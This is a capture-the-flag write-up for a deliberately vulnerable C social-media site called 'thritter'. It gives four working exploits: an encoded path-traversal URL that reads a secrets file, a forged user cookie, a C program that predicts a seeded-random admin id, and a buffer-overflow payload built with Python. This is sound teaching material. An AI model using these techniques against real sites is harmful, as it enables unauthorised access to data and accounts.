# Write up for thritter

## Overview

For this challenge we are trying exploit a website written in C. It is a social media website we have the source code for.

## Solution

### Flag 1

Looking in the source code we see there is a /secrets.txt, but we can't reach it directly as they check to ensure we are only entering a /public url.
Thus we can use url encoding to access /secrects.txt from /public.
We want ```public/../secrets.txt```, so we use a url encoder to get:
```
https://thritter.ctf-league.osusec.org/public%2F..%2Fsecrets.txt
```
Which will go to public, then back up a directory to get to secrets.txt, bypassing the websites check.
Here we get the first flag.

### Flag 2

Looking in the source code, we see there is a special /verified directory that can only be accessed when the user is "Thr33lonMusk".
We can use the console command:
```
document.cookie = "user=Thr33lonMusk"
```
Then going to /verified we get flag 2.

### Flag 3

Looking at the source code, we see flag 3 is put as a post by the admin account, but you can only see it if you're in the admin account.
We see the admin id is made from a seeded random number, so the C script:
```
void main() {
    srand(0);

    char buff[1024];
    snprintf (buff,
            sizeof (buff),
            "%X%X%X%X",
            (unsigned int) rand (),
            (unsigned int) rand (),
            (unsigned int) rand (),
            (unsigned int) rand ());

    printf("%s\n", buff);
}
```
gets the correct id for the admin account, as seeded random numbers are deterministic.
Then going to "mytheets" gets flag 3.

### Flag 4

Looking at the source code, we get flag 4 if our three posts have 1633840489, 1633969523, and 1919299174 likes respectively. 
We can do this with a buffer overflow. When inputting posts, due to a bug in the code it allows us to input a fourth post. 
This will overflow to the memory for the likes of your posts. With some trial and error, we find we need 1 byte in the fourth post 
before it overflows to likes. Then the python script:
```
num1=1633840489
num2=1633969523
num3=1919299174
print(num1.to_bytes(4, "big") + num2.to_bytes(4, "big") + num3.to_bytes(4, "big"))
```
gets us the string that will overflow to the proper likes. Inputting the result from this with one random character in front 
(i.e. the text: "aimbasedaf.fr") into the text input for the fourth post will overflow the values for the likes to the correct numbers. 
Then going to /verified we get flag 4.









